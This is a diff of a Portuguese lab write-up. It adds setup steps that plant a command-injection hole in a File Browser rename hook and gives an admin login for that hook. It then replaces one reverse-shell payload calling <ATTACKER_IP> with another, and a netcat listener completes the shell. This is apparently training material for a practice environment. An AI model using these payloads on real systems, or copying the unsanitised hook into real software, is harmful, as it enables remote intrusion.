@@ -10,6 +10,26 @@ Este documento descreve o caminho técnico para comprometer o ambiente do labora
 
 ---
 
+# Setup
+```
+docker compose build  --progress=plain  && docker compose up -d
+```
+
+## Configure a Vulnerabilidade em File Browser
+acesse `http://localhost:93/settings/global`
+user `armageddon` 
+senha `fSVRTGsfewrfesfgeRGVRSVBSR`
+
+scroll down até `After Rename`
+e setar 
+```
+/bin/bash -c "File renamed. Deprecated name: \$FILE"
+```
+este comando roda cada vez que ocorre rename de arquivo.
+![alt text](imagens/hook.png)
+---
+# Walkthrough
+
 ## 1. Enumeração e Foothold
 
 ### 1.1. Exploração Inicial (index.html)
@@ -178,7 +198,7 @@ cat foothold_b64.txt | base64 -d
 O conteúdo recuperado revelou exatamente o comando configurado pelo administrador:
 
 ```text
-sh -c "echo this old filename has been changed and is now deprecated: $FILE"
+/bin/bash -c "echo this old filename has been changed and is now deprecated: \$FILE"
 ```
 
 Como a variável **$FILE** era utilizada sem qualquer mecanismo de sanitização, tornou-se possível injetar comandos arbitrários durante a renomeação de arquivos.
@@ -186,8 +206,14 @@ Como a variável **$FILE** era utilizada sem qualquer mecanismo de sanitização
 Foi criado um arquivo qualquer no File Browser e, durante sua renomeação, foi utilizado o seguinte payload de reverse shell:
 
 ```text
-; nc <ATTACKER_IP> 4444 -e sh #
+sh -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1
 ```
+
+Renomeio o arquivo novamente, exemplo
+```text
+sh -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1;
+```
+![alt text](imagens/rename.png)
 
 Antes da execução, foi iniciado um listener na máquina atacante.
 
@@ -195,7 +221,12 @@ Antes da execução, foi iniciado um listener na máquina atacante.
 nc -lnvp 4444
 ```
 
-Ao confirmar a renomeação, o hook executou o payload injetado, estabelecendo uma conexão reversa e fornecendo um shell interativo com os privilégios do usuário **supernova**. Esse acesso permitiu iniciar a busca por mecanismos de escalonamento de privilégios presentes no sistema.
+
+
+Ao confirmar a renomeação, o hook executou o payload injetado, estabelecendo uma conexão reversa e fornecendo um shell interativo com os privilégios do usuário **supernova**.
+![alt text](imagens/revshell.png)
+
+ Esse acesso permitiu iniciar a busca por mecanismos de escalonamento de privilégios presentes no sistema.
 
 ---
 
